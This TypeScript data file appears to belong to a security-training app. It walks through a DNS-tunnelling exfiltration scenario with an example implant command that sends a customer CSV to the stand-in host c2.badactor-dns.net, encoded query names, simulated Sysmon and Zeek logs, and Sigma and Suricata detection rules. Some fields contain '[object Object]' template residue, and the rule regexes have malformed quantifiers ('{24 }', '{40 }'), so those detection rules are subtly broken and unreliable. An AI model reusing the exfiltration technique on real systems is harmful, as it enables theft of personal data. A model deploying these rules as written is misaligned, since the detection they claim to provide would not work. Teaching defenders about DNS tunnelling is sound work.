import type { AttackScenario } from '../types';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: AttackScenario = {
  id: 'dns-tunneling-exfil',
  code: 'T1071.004',
  name: 'DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration',
  shortSubtitle: 'Network & Log Analysis · Bypassing Egress Firewall via Recursive DNS',
  category: 'NETWORK_WEB',
  severity: 'HIGH',
  primaryMitrePhase: 7,
  overview: 'When strict egress firewalls block direct HTTP/HTTPS access, malware abuses the internal DNS resolver via DNS Tunneling. Sensitive stolen data is chunked, hex/base32-encoded, and prepended as high-entropy subdomains (<chunk>.c2.badactor-dns.net). When the infected host queries the corporate DNS resolver, recursive resolution forwards the query directly to the attacker authoritative Name Server—exfiltrating data without any direct TCP connection to the outside world.',
  specs: [
    { term: 'MITRE TECHNIQUES', value: 'T1071.004 (DNS C2) · T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)' },
    { term: 'PROTOCOL & PORT', value: 'UDP/53 (DNS Standard Query TXT / A)' },
    { term: 'STATISTICAL IOC', value: 'Subdomain Length > 52 chars · Shannon Entropy > 4.2 bits' },
    { term: 'THREAT TOOLING', value: 'dnscat2 / iodine / Custom Go DNS Exfiltrator' },
  ],
  nodes: [
    {
      id: 'infected_db_host',
      label: 'DB-BACKUP-02',
      sublabel: '10.50.1.12 (Isolated Host)',
      role: 'victim_host',
      x: 16,
      y: 56,
      details: {
        osOrType: 'Isolated Database Backup Host',
        pidOrPort: 'No Direct Internet Access',
        privilege: 'Compromised Host',
        artifacts: ['Process: sync_agent.exe', 'Sysmon EID 22 (DNSEvent)'],
        description: 'Air-gapped/restricted internal server blocked from direct internet egress, permitted only to query internal DNS.' } },
    {
      id: 'corp_firewall',
      label: 'Egress Firewall',
      sublabel: 'Blocks TCP 80/443',
      role: 'firewall_siem',
      x: 42,
      y: 68,
      details: {
        osOrType: 'Next-Gen Perimeter Firewall',
        pidOrPort: 'Policy: Deny All Direct Egress',
        privilege: 'Perimeter Gate',
        artifacts: ['Direct TCP/443 Dropped', 'Recursive UDP/53 from 10.50.1.53 Allowed'],
        description: 'Perimeter firewall dropping direct outbound traffic from DB-BACKUP-02 while permitting UDP/53 from the internal DNS resolver.' } },
    {
      id: 'internal_dns',
      label: 'Internal DNS Resolver',
      sublabel: '10.50.1.53 (Unbound/AD)',
      role: 'dns_resolver',
      x: 48,
      y: 28,
      details: {
        osOrType: 'Corporate Recursive DNS Server',
        pidOrPort: 'UDP/53 · Zeek dns.log',
        privilege: 'Infrastructure Relay',
        artifacts: ['High rate of unique TXT queries to badactor-dns.net', 'Cache Miss Ratio: 100%'],
        description: 'Corporate DNS server acting as an unwitting relay, forwarding uncached subdomain queries to the attacker authoritative NS.' } },
    {
      id: 'attacker_ns',
      label: 'Attacker Auth NS',
      sublabel: 'ns1.badactor-dns.net',
      role: 'attacker',
      x: 84,
      y: 44,
      details: {
        osOrType: 'Rogue Authoritative Name Server',
        pidOrPort: '45.133.1.99:53 (dnscat2 server)',
        privilege: 'Attacker C2 / Exfil Sink',
        artifacts: ['Reassembles hex subdomains into customers.csv', 'Replies with C2 commands in TXT records'],
        description: 'Attacker-controlled authoritative Name Server reassembling subdomain chunks into the stolen file and encoding commands in TXT answers.' } },
  ],
  processTree: [
    {
      pid: 4412,
      ppid: 1900,
      name: 'sync_agent.exe',
      commandLine: 'C:\\ProgramData\\sync_agent.exe --file C:\\Backups\\customers_pii.csv --domain c2.badactor-dns.net',
      user: 'CORP\\svc_backup',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: ['ReadFile("customers_pii.csv")', 'DnsQuery_A(DNS_TYPE_TXT)', 'Sleep(150)'] },
  ],
  stages: [
    {
      index: 1,
      title: 'CHUNK & HEX-ENCODE STOLEN DATA INTO SUBDOMAINS',
      subtitle: 'Sysmon Event ID 22 captures high-entropy DNS query from sync_agent.exe',
      description: 'The exfiltration implant reads customers_pii.csv, splits it into 48-byte chunks, hex-encodes each chunk, and issues a DNS TXT query for <seq>.<hex_data>.c2.badactor-dns.net to the internal resolver (10.50.1.53). Sysmon Event ID 22 on the endpoint logs the exact process (sync_agent.exe) and the anomalous query name.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1048.003',
      mitreTechniqueName: 'Exfiltration Over Unencrypted Non-C2 Protocol',
      activeNodeIds: ['infected_db_host', 'internal_dns'],
      compromisedNodeIds: ['infected_db_host'],
      keySpecs: [
        { term: 'SYSMON EVENT', value: 'Event ID 22 (DNSEvent - DNS Query)' },
        { term: 'QUERY FORMAT', value: '001.4a6f686e2c393831323030.c2.badactor-dns.net' },
        { term: 'SHANNON ENTROPY', value: '4.48 bits/char (Normal domains < 3.2)' },
      ] },
    {
      index: 2,
      title: 'RECURSIVE RELAY THROUGH CORPORATE DNS SERVER',
      subtitle: '100% cache miss forces recursive forwarding to attacker Name Server',
      description: 'Because every subdomain label contains a unique chunk of encrypted data, the internal DNS resolver experiences a 100% cache miss rate. Following standard DNS recursion, 10.50.1.53 forwards every query across the firewall to the authoritative Name Server for badactor-dns.net.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1071.004',
      mitreTechniqueName: 'Application Layer Protocol: DNS',
      activeNodeIds: ['internal_dns', 'corp_firewall', 'attacker_ns'],
      compromisedNodeIds: ['infected_db_host', 'attacker_ns'],
      keySpecs: [
        { term: 'NETWORK LOG', value: 'Zeek dns.log / BIND query.log' },
        { term: 'CACHE MISS RATE', value: '100% Unique Subdomains per parent domain' },
        { term: 'RECORD TYPE', value: 'TXT (qtype = 16) · TTL = 0' },
      ] },
    {
      index: 3,
      title: 'REASSEMBLE EXFILTRATED DATA & RETURN TXT C2 COMMAND',
      subtitle: 'Bidirectional C2 payload returned inside DNS TXT response',
      description: 'The attacker authoritative server strips the hex labels from incoming queries to reconstruct customers_pii.csv, and replies with a DNS TXT record (TTL=0) carrying an encrypted ACK or next C2 task back to the implant.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1071.004',
      mitreTechniqueName: 'Bidirectional DNS Tunneling C2',
      activeNodeIds: ['attacker_ns', 'internal_dns', 'infected_db_host'],
      compromisedNodeIds: ['infected_db_host', 'attacker_ns'],
      keySpecs: [
        { term: 'DNS ANSWER', value: 'TXT "ACK:001:CMD:SLEEP_60"' },
        { term: 'RESPONSE TTL', value: '0 seconds (Prevents DNS caching)' },
        { term: 'MITIGATION', value: 'DNS RPZ (Response Policy Zones) & Entropy Thresholding' },
      ] },
  ],
  telemetry: [
    {
      id: 'dns-1',
      no: 1,
      stageIndex: 1,
      timestamp: '22:10:04.015',
      sourceNodeId: 'infected_db_host',
      targetNodeId: 'internal_dns',
      sourceLabel: '10.50.1.12 (sync_agent)',
      targetLabel: '10.50.1.53:53',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 22',
      shortAction: 'DNS TXT EXFIL',
      info: 'QueryName="001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net"',
      sizeOrCode: '112 B',
      severity: 'HIGH',
      mitreId: 'T1048.003',
      explanation: 'Sysmon Event ID 22 links the DNS query directly to C:\\ProgramData\\sync_agent.exe. Decoding the hex subdomain label "343130322c6a6f686e5f736d6974682c32303635" reveals the plaintext CSV row "4102,john_smith,2065"!',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>22</EventID>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-11-12 22:10:04.015</Data>
    <Data Name="ProcessId">4412</Data>
    <Data Name="QueryName">001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net</Data>
    <Data Name="QueryStatus">0</Data>
    <Data Name="QueryResults">type: 16 ACK:001:NEXT;</Data>
    <Data Name="Image">C:\\ProgramData\\sync_agent.exe</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'High-Length Hex/Base64 Subdomain DNS Tunneling Detection',
        ruleCode: `title: Suspicious High-Length DNS Subdomain Query
logsource:
  product: windows
  category: dns_query
detection:
  selection:
    QueryName|re: '^[a-fA-F0-9]{24 }\.'
  condition: selection
level: high`,
        mitigation: 'Alert on high counts of unique subdomain queries per eTLD+1 in SIEM and block Newly Registered Domains (NRDs) via DNS RPZ.' } },
    {
      id: 'dns-2',
      no: 2,
      stageIndex: 2,
      timestamp: '22:10:04.042',
      sourceNodeId: 'internal_dns',
      targetNodeId: 'attacker_ns',
      sourceLabel: '10.50.1.53 (DNS)',
      targetLabel: '45.133.1.99:53',
      sourceType: 'NETWORK',
      protocolOrEventId: 'Zeek dns.log',
      shortAction: 'RECURSIVE TXT',
      info: 'qtype_name=TXT query="001.343130...badactor-dns.net" answers="ACK:001:NEXT" TTL=0',
      sizeOrCode: '164 B',
      severity: 'CRITICAL',
      mitreId: 'T1071.004',
      explanation: 'Zeek dns.log captures the recursive query leaving the internal resolver and returning a TXT record with TTL=0.000000 to bypass caching.',
      rawLog: `#fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p proto trans_id query qtype_name rcode_name answers TTLs
1794521404.042 CHhAvVGS1DHFjwGM9 10.50.1.53 58192 45.133.1.99 53 udp 41902 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net TXT NOERROR ACK:001:NEXT 0.000000`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Abnormal Volume of DNS TXT Queries with Zero TTL',
        ruleCode: `alert dns any any -> any any (
  msg:"SOC DNS Tunneling Long Subdomain Label > 40 Chars";
  dns.query; content:"."; pcre:"/^[a-zA-Z0-9]{40 }\./";
  threshold: type both, track by_src, count 10, seconds 30;
  classtype:policy-violation; sid:9004120; rev:1;
)`,
        mitigation: 'Enforce DNS Response Policy Zones (RPZ) and rate-limit outbound TXT/NULL queries to uncategorized domains.' } },
    {
      id: 'dns-3',
      no: 3,
      stageIndex: 3,
      timestamp: '22:10:04.095',
      sourceNodeId: 'attacker_ns',
      targetNodeId: 'internal_dns',
      sourceLabel: '45.133.1.99:53 (ns1.badactor-dns.net)',
      targetLabel: '10.50.1.53 -> 10.50.1.12 (sync_agent.exe)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'DNS TXT Response (TTL=0)',
      shortAction: 'TXT C2 ACK & CMD',
      info: 'answers="TXT ACK:001:CMD:SLEEP_60" TTL=0 -> Relayed to DB-BACKUP-02 (10.50.1.12)',
      sizeOrCode: '188 B',
      severity: 'CRITICAL',
      mitreId: 'T1071.004',
      explanation: 'Attacker authoritative Name Server (45.133.1.99) strips and reassembles the hex-encoded subdomain chunks into customers_pii.csv, then responds with a DNS TXT answer ("ACK:001:CMD:SLEEP_60", TTL=0) that the internal resolver relays back to sync_agent.exe (PID 4412) on DB-BACKUP-02.',
      rawLog: `22:10:04.095210 IP 45.133.1.99.53 > 10.50.1.53.58192: 41902* 1/0/0 TXT "ACK:001:CMD:SLEEP_60" (ttl 0)
[dnscat2-server] Chunk #001 reassembled -> customers_pii.csv (48 bytes appended: "4102,john_smith,2065...")`,
      detectionRule: {
        type: 'SIGMA',
        title: 'DNS TXT Response Carrying Encoded C2 Tasking with Zero TTL',
        ruleCode: `title: Suspicious DNS TXT C2 Response with Zero TTL
logsource:
  category: dns
detection:
  selection:
    qtype_name: 'TXT'
    TTLs: '0.000000'
    answers|contains:
      - 'ACK:'
      - 'CMD:'
  condition: selection
level: critical`,
        mitigation: 'Block authoritative resolution to newly registered domains (NRDs), strip or inspect high-entropy DNS TXT responses at the recursive resolver, and isolate DB-BACKUP-02 (10.50.1.12).' } },
  ] };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'dns-tunneling-exfil',
    briefing: {
      headline: 'Scenario Briefing: DNS Tunneling & Data Exfiltration (MITRE T1071.004 / T1048.003)',
      storyAnalogy:
        'Imagine a locked-down prison facility where inmates are forbidden from mailing letters or making outside phone calls, but they are allowed to ask the prison operator: "What is the phone number for [Company Name]?" The operator is required to call the outside directory to check. So the inmate asks: "What is the phone number for Secret-Blueprint-Page1-4a6f686e.evil-c2.net?" The prison operator faithfully reads that exact secret message out loud to the accomplice waiting at the evil-c2.net directory desk.',
      plainSummary:
        'In this scenario (T1071.004, DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration) at 10.50.1, the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: chunking (PID 4412, running as CORP\\svc_backup), then recursive Relay Through the Corporate DNS (ns1.badactor-dns.net at 45.133.1.99:53), then reassembling Exfiltrated CSV Chunks (ns1.badactor-dns.net, 45.133.1.99:53). Steps #1–#3 walk that chain end-to-end by covering Chunking (PID 4412, running as CORP\\svc_backup), then Recursive Relay Through the Corporate DNS (ns1.badactor-dns.net at 45.133.1.99:53), then Reassembling Exfiltrated CSV Chunks (ns1.badactor-dns.net, 45.133.1.99:53). Primary detection correlates Sysmon Event 22 with the documented host and network chain.',
      diagramTopologySummary:
        'On the diagram: Start at Node ③/④ (Isolated Host DB-BACKUP-02 10.50.1.12 & sync_agent.exe PID 4412), follow Step #1 (#1→) sending high-entropy DNS TXT queries to Node ② (Internal DNS Resolver 10.50.1.53), trace Step #2 (#2→) recursively relaying the queries across the Egress Firewall to Node ① (Attacker Auth NS ns1.badactor-dns.net 45.133.1.99:53), and watch Step #3 (#3→) return the TXT C2 command ("ACK:001:CMD:SLEEP_60", TTL=0) while Node ⑥ (SOC SIEM / Zeek DNS Sensor) flags the tunnel.',
      documentedAdvisory: 'MITRE ATT&CK T1071.004 & T1048.003 · SANS DNS Tunneling Detection · Sysmon EventID 22 / Zeek dns.log',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1048.003',
        plainTitle: 'Chunking & Hex-Encoding Stolen Data Into High-Entropy Subdomain Queries (Sysmon Event ID 22)',
        storyAnalogy:
          'Before speaking to the prison operator, the inmate shreds the stolen customer ledger (customers_pii.csv) into 48-byte strips and encodes every strip in hexadecimal letters and numbers so it looks like a valid subdomain lookup.',
        simpleExplanation:
          'On the isolated database host DB-BACKUP-02 (10.50.1.12, which has no direct internet access because the Egress Firewall blocks TCP ports 80 and 443), the implant C:\\ProgramData\\sync_agent.exe (PID 4412, running as CORP\\svc_backup) calls ReadFile("customers_pii.csv"), slices each row into 48-byte chunks, hex-encodes the bytes (for example, turning "4102,john_smith,2065" into "343130322c6a6f686e5f736d6974682c32303635"), and calls DnsQuery_A(DNS_TYPE_TXT) to send a 112-byte UDP/53 DNS TXT query for 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net to the Internal DNS Resolver (10.50.1.53:53).',
        howItWorksInPractice:
          'Standard DNS resolvers permit alphanumeric labels up to 63 characters per subdomain label. By hex-encoding 48-byte CSV chunks (producing a Shannon entropy of 4.48 bits/char compared to <3.2 for normal domain names) and querying the local corporate DNS resolver (10.50.1.53:53), sync_agent.exe (PID 4412) receives QueryStatus = 0 with QueryResults = "type: 16 ACK:001:NEXT;" (confirming chunk #001 was delivered and acknowledged so the loop can advance to chunk #002 after Sleep(150), while Sysmon Event ID 22 logs the query on the host).',
        diagramAlignment:
          'On the diagram, follow Step #1 / Link #1 (#1→ / ⇠#1) from Node ③ (DB-BACKUP-02 10.50.1.12 / sync_agent.exe PID 4412) to Node ② (Internal DNS Resolver 10.50.1.53:53), logging Sysmon Event ID 22 (112 B DNS TXT query and ACK:001:NEXT response).',
        detectionAndEvidence:
          'Documented in Sysmon EventID 22 (DNSEvent): ProcessId = 4412, Image = C:\\ProgramData\\sync_agent.exe, QueryName = 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net, QueryStatus = 0, QueryResults = "type: 16 ACK:001:NEXT;".',
      },
      {
        stepNumber: 2,
        mitreId: 'T1071.004',
        plainTitle: 'Recursive Relay Through the Corporate DNS Server Across the Egress Firewall (Zeek dns.log)',
        storyAnalogy:
          'The trusted internal prison operator (Internal DNS Resolver 10.50.1.53) checks their local binder, sees a 100% cache miss because every subdomain is a brand-new chunk of stolen data, and automatically calls the outside internet (45.133.1.99:53) to resolve it.',
        simpleExplanation:
          'Because every single query from DB-BACKUP-02 contains a unique hex-encoded chunk of stolen data in the subdomain label (guaranteeing a 100% DNS cache miss rate so the resolver can never answer from local cache), the Internal DNS Resolver (10.50.1.53) follows standard recursive DNS resolution and forwards the 164-byte UDP/53 TXT query across the Egress Firewall directly to the authoritative Name Server for badactor-dns.net (ns1.badactor-dns.net at 45.133.1.99:53).',
        howItWorksInPractice:
          'While the Egress Firewall blocks direct outbound connections from DB-BACKUP-02 (10.50.1.12), it permits outbound UDP/53 recursive queries originating from the corporate DNS server (10.50.1.53, which receives back the authoritative TXT answer "ACK:001:NEXT" with TTL = 0.000000 and records the 164-byte exchange in Zeek dns.log). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, follow Step #2 / Link #2 (#2→ / ⇠#2) from Node ② (Internal DNS Resolver 10.50.1.53) across the Egress Firewall to Node ① (Attacker Auth NS ns1.badactor-dns.net 45.133.1.99:53), captured in Zeek dns.log (164 B).',
        detectionAndEvidence:
          'Documented in Zeek dns.log & Suricata SID 9004120: 10.50.1.53 -> 45.133.1.99:53 recursive TXT query (qtype = 16, 164 B) with 100% unique subdomains (>52 chars) and answers="ACK:001:NEXT" with TTL = 0.000000.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1071.004',
        plainTitle: 'Reassembling Exfiltrated CSV Chunks & Returning C2 Commands in DNS TXT Answers (TTL=0)',
        storyAnalogy:
          'The accomplice sitting at the ns1.badactor-dns.net desk strips the hex code off every incoming question to rebuild customers_pii.csv, and replies with a DNS TXT answer (ACK:001:CMD:SLEEP_60) that rides all the way back to the implant.',
        simpleExplanation:
          'When the recursive query arrives at the attacker’s authoritative Name Server (ns1.badactor-dns.net, 45.133.1.99:53), the dnscat2/exfil daemon strips the .c2.badactor-dns.net suffix, hex-decodes chunk #001 back into plaintext CSV rows (customers_pii.csv), and sends back a 188-byte DNS TXT response (TXT "ACK:001:CMD:SLEEP_60" with TTL = 0 seconds so the corporate DNS server will not cache the answer). The Internal DNS Resolver (10.50.1.53) relays that 188-byte TXT answer right back to sync_agent.exe (PID 4412) on DB-BACKUP-02 (10.50.1.12).',
        howItWorksInPractice:
          'This completes a bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS query subdomain labels (QNAME), while inbound acknowledgments and C2 tasking (the 188-byte TXT "ACK:001:CMD:SLEEP_60" response with rcode = 0 NOERROR and TTL = 0) ride back inside the DNS TXT answer record to pace the implant’s exfiltration loop. Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'On the diagram, Step #3 / Link #3 (#3→ / ⇠#3) returns the DNS TXT response (TXT ACK:001:CMD:SLEEP_60, 188 B, TTL=0) from Node ① (ns1.badactor-dns.net 45.133.1.99:53) to Node ② (Internal DNS Resolver 10.50.1.53) and back to Node ③/④ (DB-BACKUP-02), while Node ⑥ (SIEM) triggers the critical DNS C2 alert.',
        detectionAndEvidence:
          'Documented in Sigma & Suricata DNS rules: 188-byte DNS TXT response with TTL = 0.000000 carrying "TXT ACK:001:CMD:SLEEP_60" from 45.133.1.99:53 through 10.50.1.53 to DB-BACKUP-02 (10.50.1.12).',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
      briefing: {
        storyAnalogy:
          'A strict warehouse bans all delivery trucks from leaving the yard, allowing only tiny postal inquiry slips through the front mail slot. An insider breaks a thick customer ledger into coded postcard labels, mails each label as a routine address lookup, and receives brief coded replies tucked into the return postage stamps.',
        storyMappings: [
          {
            storyTerm: 'Front mail slot',
            technicalTerm: 'Permitted UDP port 53 DNS egress path',
            tone: 'amber',
          },
          {
            storyTerm: 'Coded postcard label',
            technicalTerm: 'Hex-encoded high-entropy DNS subdomain',
            tone: 'sky',
          },
          {
            storyTerm: 'Local post office relay',
            technicalTerm: 'Internal corporate recursive DNS resolver',
            tone: 'rose',
          },
          {
            storyTerm: 'Return postage stamp',
            technicalTerm: 'Authoritative DNS TXT response record',
            tone: 'emerald',
          },
        ],
      },
      steps: {
        1: {
          storyAnalogy:
            'Inside the locked archive room, a rogue clerk slices a private customer sheet into tiny numbered strips and converts every letter into pairs of digits. Each coded strip becomes the street label on an outgoing postal lookup card.',
          storyMappings: [
            {
              storyTerm: 'Rogue archive clerk',
              technicalTerm: 'Compromised sync_agent.exe process',
              tone: 'amber',
            },
            {
              storyTerm: 'Numbered digit strips',
              technicalTerm: 'Chunked hexadecimal subdomain labels',
              tone: 'sky',
            },
            {
              storyTerm: 'Outgoing postal lookup card',
              technicalTerm: 'DNS TXT query packet',
              tone: 'rose',
            },
            {
              storyTerm: 'External mail district',
              technicalTerm: 'Attacker-owned authoritative domain',
              tone: 'emerald',
            },
          ],
          detectionAndEvidence:
            'Documented in Sysmon EventID 22 (DNSEvent, which records every process-level domain lookup so defenders can tie abnormal queries back to a specific binary): ProcessId = 4412, Image = C:\\ProgramData\\sync_agent.exe, QueryName = 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net, QueryStatus = 0, QueryResults = "type: 16 ACK:001:NEXT;" (confirming a long hex-encoded subdomain returning a TXT acknowledgment string).',
        },
        2: {
          storyAnalogy:
            'The clerk drops the lookup card into the company mailroom rather than walking to the front gate. Because the gate guard trusts every bag stamped by the company mailroom, the coded inquiry sails straight outside to the remote district office.',
          storyMappings: [
            {
              storyTerm: 'Company mailroom',
              technicalTerm: 'Internal recursive DNS resolver (10.50.1.53)',
              tone: 'amber',
            },
            {
              storyTerm: 'Front gate guard',
              technicalTerm: 'Corporate egress perimeter firewall',
              tone: 'sky',
            },
            {
              storyTerm: 'Mailroom stamped bag',
              technicalTerm: 'Forwarded upstream UDP/53 recursive query',
              tone: 'rose',
            },
            {
              storyTerm: 'Remote district office',
              technicalTerm: 'External authoritative DNS nameserver',
              tone: 'emerald',
            },
          ],
        },
        3: {
          storyAnalogy:
            'The remote district office copies the digit strip off each incoming card to rebuild the stolen customer ledger in order. It then writes a short receipt and next-task note on a return slip marked to expire immediately so the company mailroom never keeps a cached copy.',
          storyMappings: [
            {
              storyTerm: 'Rebuilt customer ledger',
              technicalTerm: 'Reassembled exfiltrated CSV records',
              tone: 'amber',
            },
            {
              storyTerm: 'Return slip note',
              technicalTerm: 'DNS TXT response carrying ACK and sleep directives',
              tone: 'sky',
            },
            {
              storyTerm: 'Immediate expiry stamp',
              technicalTerm: 'Zero-second TTL value preventing resolver caching',
              tone: 'rose',
            },
            {
              storyTerm: 'Archive room workstation',
              technicalTerm: 'Source database backup host (10.50.1.12)',
              tone: 'emerald',
            },
          ],
          detectionAndEvidence:
            'Documented in Sigma and Suricata DNS rules (network and host detection signatures that flag covert command-and-control over domain lookups): 188-byte DNS TXT response with TTL = 0.000000 carrying "TXT ACK:001:CMD:SLEEP_60" from 45.133.1.99:53 through 10.50.1.53 to DB-BACKUP-02 (10.50.1.12) (because legitimate business records rarely pair zero-second caching with high-entropy hex subdomains).',
        },
      },
    };
